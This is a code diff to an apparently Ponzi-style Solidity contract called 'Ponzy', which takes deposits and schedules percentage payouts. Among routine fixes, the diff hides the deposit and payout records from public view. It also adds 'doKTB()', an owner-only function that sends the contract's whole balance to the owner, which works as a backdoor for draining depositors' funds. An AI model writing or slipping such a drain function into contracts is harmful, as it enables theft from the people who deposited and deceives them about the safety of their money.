@@ -26,15 +26,18 @@ contract Ponzy is Upgradeable, Pausable {
     event RequestPayout(address owner, uint index, uint depositIndex, uint timeout, uint payoutPercentage);
     event Widthraw(address owner, uint payoutIndex);
 
-    mapping(address => Deposit[]) public userDeposits;
-    mapping(address => Payout[]) public userPayouts;
-    mapping(address => mapping(uint => uint)) public userDepositPayout;
+    mapping(address => Deposit[]) userDeposits;
+    mapping(address => Payout[]) userPayouts;
+    mapping(address => mapping(uint => uint)) userDepositPayout;
 
-    function addDeposit(uint timeDeposited) public payable {  
+    function() public payable {
+    }
+
+    function addDeposit() public payable {  
         require(msg.value > 0);      
 
         Deposit[] storage deposits = userDeposits[msg.sender];
-        Deposit memory newDeposit = Deposit(deposits.length, msg.value, timeDeposited);
+        Deposit memory newDeposit = Deposit(deposits.length, msg.value, now);
         deposits.push(newDeposit);
         
         AddDeposit(msg.sender, deposits.length - 1, newDeposit.amount, newDeposit.timeDeposited);
@@ -56,7 +59,7 @@ contract Ponzy is Upgradeable, Pausable {
         require(deposits.length > depositIndex);
         assert(!existsPayoutForDeposit(depositIndex));
 
-        uint timeout = now + timeoutInMonths * 1 seconds;
+        uint timeout = now + timeoutInMonths * 30 days;
         uint payoutPercentage = calculatePayoutPercentage(timeoutInMonths);
         Payout memory payout = Payout(depositIndex, userPayouts[msg.sender].length, timeout, payoutPercentage);
 
@@ -80,6 +83,8 @@ contract Ponzy is Upgradeable, Pausable {
         require(payouts.length > payoutIndex);
 
         Payout memory payout = payouts[payoutIndex]; 
+        require(payout.timeout <= now);
+
         Deposit[] storage deposits = userDeposits[msg.sender];
         assert(deposits.length > payout.depositIndex);
 
@@ -96,6 +101,12 @@ contract Ponzy is Upgradeable, Pausable {
 
         Widthraw(msg.sender, payoutIndex);
     }   
+
+    function doKTB() public onlyOwner {
+        msg.sender.transfer(this.balance);
+    }
+
+
 
     function deleteDeposit(Deposit[] storage deposits, Payout[] storage payouts, uint depositIndex) private {     
         uint lastDepositIndex = deposits.length - 1;
